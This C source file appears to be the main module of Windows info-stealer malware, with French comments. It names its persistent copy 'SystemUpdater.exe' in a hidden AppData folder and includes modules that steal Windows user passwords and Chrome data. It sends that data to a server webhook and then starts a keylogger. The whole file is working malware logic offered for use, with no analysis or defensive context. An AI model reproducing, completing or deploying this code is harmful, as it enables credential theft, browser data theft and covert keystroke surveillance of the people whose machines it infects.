#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <io.h>

#include "computer_informations.c"
#include "windows_users_passwords.c"
#include "chrome_data.c"
#include "persistance.c"
#include "keylogger.c"

#include "../include/http.h"
#include "../include/structures.h" //structure COMPUTER_INFOS

int is_first_execution(char *current_executable_path, char *softwareDataDirectory, char *fake_executable_name)
{

    /*Vérifier que c'est la première execution en regardant si le le la faux executable du logiciel existe déja */

    char fake_executable_path[256];
    snprintf(fake_executable_path, 256, "%s\\%s", softwareDataDirectory, fake_executable_name);
    return _access(fake_executable_path, 0); // de io.h, pour vérifier si le fichier existe
};

int main(void)
{

    char fake_executable_name[] = "SystemUpdater.exe";

    char current_executable_path[MAX_PATH];
    GetModuleFileName(NULL, current_executable_path, MAX_PATH);

    // COMPUTER_INFOS est une structure de ../include/structures.h
    COMPUTER_INFOS computer;
    get_computer_info(&computer);

    char softwareDataDirectory[1024];
    snprintf(softwareDataDirectory, 1024, "C:\\Users\\%s\\AppData\\Local\\G666", computer.username);

    if (is_first_execution(current_executable_path, softwareDataDirectory, fake_executable_name))
    {
        // je créer le dossier du logiciel
        CreateDirectory(softwareDataDirectory, NULL);
        set_persistance(softwareDataDirectory, current_executable_path, fake_executable_name); // fonction à amméliorer pour que si refus des droits admin, dossier de démarage simplement

        // C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp // dossier de démarrage de windows

        /*// Chemin du répertoire du logiciel et nom de l'exécutable
        const char *repertoireLogiciel = "C:\\Users\\%s\\AppData\\Local\\G666";
        const char *nomExecutable = "main.exe";
        add_winstart(repertoireLogiciel, nomExecutable);*/

        save_and_send_windows_users_password(&computer);
        send_chrome_data_files(&computer);
    }

    printf("\nComputer Name: %s\n", computer.computer_name);
    printf("Username: %s\n", computer.username);
    printf("Windows Version: %s\n", computer.windows_version);
    printf("Architecture: %s\n\n", computer.architecture);

    send_to_server("webhook/client.php", "{\"client_id\":1}");

    start_keylogger();

    return 0;
}